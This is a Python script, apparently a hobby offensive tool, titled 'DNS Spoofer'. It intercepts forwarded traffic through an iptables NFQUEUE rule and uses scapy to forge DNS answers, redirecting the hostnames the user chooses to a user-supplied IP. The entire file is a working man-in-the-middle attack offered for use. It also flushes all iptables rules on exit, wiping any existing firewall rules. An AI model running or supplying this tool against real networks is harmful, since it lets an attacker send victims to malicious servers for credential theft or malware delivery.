#!/usr/bin/env python

import netfilterqueue
from scapy.all import *
from colorama import Fore, Style
import os


print(Fore.RED + """
    ██████╗ ███╗   ██╗███████╗    ███████╗██████╗  ██████╗  ██████╗ ███████╗███████╗██████╗ 
    ██╔══██╗████╗  ██║██╔════╝    ██╔════╝██╔══██╗██╔═══██╗██╔═══██╗██╔════╝██╔════╝██╔══██╗
    ██║  ██║██╔██╗ ██║███████╗    ███████╗██████╔╝██║   ██║██║   ██║█████╗  █████╗  ██████╔╝
    ██║  ██║██║╚██╗██║╚════██║    ╚════██║██╔═══╝ ██║   ██║██║   ██║██╔══╝  ██╔══╝  ██╔══██╗
    ██████╔╝██║ ╚████║███████║    ███████║██║     ╚██████╔╝╚██████╔╝██║     ███████╗██║  ██║
    ╚═════╝ ╚═╝  ╚═══╝╚══════╝    ╚══════╝╚═╝      ╚═════╝  ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═╝                                                                            
""" + Style.RESET_ALL)



def get_dns_hosts():
    dns_hosts = {}
    print("\n Type 'done' if you want to continue. ")

    try:
        redirect_input = input(Fore.GREEN + "Enter the IP you want to redirect to: ")
        while True:
            user_input = input(Fore.GREEN + "Enter the DNS hosts you want to target: \n")
            if user_input.lower() == "done":
                break
            dns_hosts[user_input.encode('utf-8')] = redirect_input
        return dns_hosts
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Quitting..." + Style.RESET_ALL)
        os.system("iptables --flush")
        sys.exit()



def process_packet(packet):
    """
        Intercepting the packets and call the modify_packet to modify it
    """
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):
        print(Fore.RED + scapy_packet.summary()[20:len(scapy_packet.summary())-2]+ Style.RESET_ALL)
        try:
            scapy_packet = modify_packet(scapy_packet)
        except IndexError:
            pass
        print(Fore.BLUE + scapy_packet.summary()[20:len(scapy_packet.summary())-2] + Style.RESET_ALL)
        # accepts bytes-like data
        packet.set_payload(bytes(scapy_packet))
    packet.accept()

def modify_packet(packet):
    # target link
    qname = packet[DNSQR].qname
    print(dns_hosts)
    print(qname)
    if qname not in dns_hosts:
        print(Fore.GREEN + "[+] Original packet passed: ", qname)
        return packet

    print(dns_hosts[qname])
    # rdata -> redirecting toa
    packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
    # send only one response
    packet[DNS].ancount = 1
    # chcksum/len are security measures -> None
    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum
    return packet



if __name__ == "__main__":
    q_num = 0
    dns_hosts = get_dns_hosts()


    try:
        # For other machines
        os.system(f"iptables -I FORWARD -j NFQUEUE --queue-num {q_num}")
        print(Fore.GREEN + f"\n[+] Forwarding to queue number {q_num}.")

        # Local targeting
        # os.system("iptables -I INPUT -j NFQUEUE --queue-num 0")
        # os.system("iptables -I OUTPUT -j NFQUEUE --queue-num 0")

        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, process_packet)
        queue.run()

    except KeyboardInterrupt:
        # Reset iptables
        os.system("iptables --flush")
        print(Fore.CYAN + "[+] Iptables flushed!" + Style.RESET_ALL)